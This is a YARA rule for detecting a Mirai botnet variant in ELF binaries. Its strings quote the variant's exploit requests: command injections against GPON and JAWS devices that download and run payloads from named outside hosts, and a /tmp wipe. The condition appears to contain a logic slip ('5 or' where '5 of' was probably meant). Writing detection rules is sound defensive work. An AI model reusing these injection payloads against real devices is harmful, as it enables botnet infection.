rule Linux_ARCH68K_Mirai_Variant_2022_03_15 {
  meta:
    description = "Detects new ARCH68K Mirai variant"
    author      = "Mehmet Ali Kerimoglu a.k.a. CYB3RMX"
    date        = "2022-03-15"
    hash1       = "0519f412cb9932cb961d9707d19a8cdeb61955a4587bd98d3de9b8be1059f7f1"

  strings:
    $request1 = "POST /GponForm/diag_Form?style/ HTTP/1.1" wide ascii
    $request2 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1" wide ascii
    $request3 = "GET /shell?cd+/tmp;rm+-rf+*;wget+ jswl.jdaili.xyz/jaws;sh+/tmp/jaws HTTP/1.1" wide ascii
    $request4 = "User-Agent: Hello, World" wide ascii
    $request5 = "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`busybox+wget+http://209.141.33.141/bin+-O+/tmp/gaf;sh+/tmp/gaf`&ipv=0" wide ascii
    $request6 = "dslf-config" wide ascii
    $request7 = "/bin/busybox wget -g jswl.jdaili.xyz -l /tmp/.hiroshima -r /596a96cc7bf9108cd896f33c44aedc8a/db0fa4b8db0333367e9bda3ab68b8042.mips" wide ascii

  condition:
    uint16(0) == 0x457f and (5 or all of ($request*))
}